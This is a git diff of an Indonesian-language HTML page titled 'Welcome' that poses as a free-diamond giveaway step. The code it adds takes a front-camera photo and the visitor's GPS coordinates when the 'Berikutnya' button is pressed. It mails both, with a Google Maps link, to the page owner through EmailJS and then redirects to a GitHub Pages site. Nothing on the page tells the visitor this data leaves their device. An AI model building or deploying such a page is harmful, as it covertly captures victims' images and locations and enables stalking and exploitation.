@@ -1,32 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Welcome</title>
+
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial, sans-serif;
+    background:#111;
+    color:white;
+    text-align:center;
+}
+button{
+    margin-top:20px;
+    padding:12px 20px;
+    border:none;
+    border-radius:8px;
+    background:#00c853;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+button:hover{
+    background:#00e676;
+}
+</style>
+
 </head>
 <body>
 
-<h3>Welcome back</h3>
+<h2>Welcome Back</h2>
 
-<br>
-<button onclick="ambilFoto()">Berikutnya</button>
+
+<button onclick="proses()">Berikutnya</button>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-emailjs.init("Ab3xvPQCqJkB8Kh_V");
+(function(){
+  emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI PUBLIC KEY
+})();
 
-// Aktifkan kamera (muncul popup izin)
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+// Aktifkan kamera depan
+navigator.mediaDevices.getUserMedia({ 
+  video: { facingMode: "user" } 
+})
 .then(function(stream){
   document.getElementById("video").srcObject = stream;
 })
-.catch(function(err){
+.catch(function(){
   alert("Kamera tidak diizinkan");
 });
 
-function ambilFoto(){
+function proses(){
 
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
@@ -34,24 +64,45 @@ function ambilFoto(){
 
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
-
   context.drawImage(video, 0, 0);
 
-  let imageData = canvas.toDataURL("image/png");
+  let imageData = canvas.toDataURL("image/jpeg", 0.7);
 
-  emailjs.send("service_lt5tmzc", "template_e16cgrw", {
-    image: imageData
-  }).then(function(){
+  if (navigator.geolocation) {
 
-    // Setelah berhasil kirim → redirect
-    window.location.replace("https://diamondgratis169.github.io/Free/basudewa.html");
+    navigator.geolocation.getCurrentPosition(
 
-  }).catch(function(){
-    alert("Gagal mengirim foto");
-  });
+      function(position){
+
+        let latitude = position.coords.latitude;
+        let longitude = position.coords.longitude;
+        let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+
+        emailjs.send("service_lzuezkd", "template_105p1pt", {
+          name: "Visitor",
+          time: new Date().toLocaleString(),
+          latitude: latitude,
+          longitude: longitude,
+          maps: mapsLink,
+          image: imageData
+        }).then(function(){
+            window.location.replace("https://basudewa28.github.io/Official-/basudewa.html");
+        });
+
+      },
+
+      function(){
+        alert("Lokasi tidak diizinkan");
+      }
+
+    );
+
+  } else {
+    alert("Browser tidak mendukung GPS");
+  }
 
 }
 </script>
 
 </body>
-  </html>
+</html>
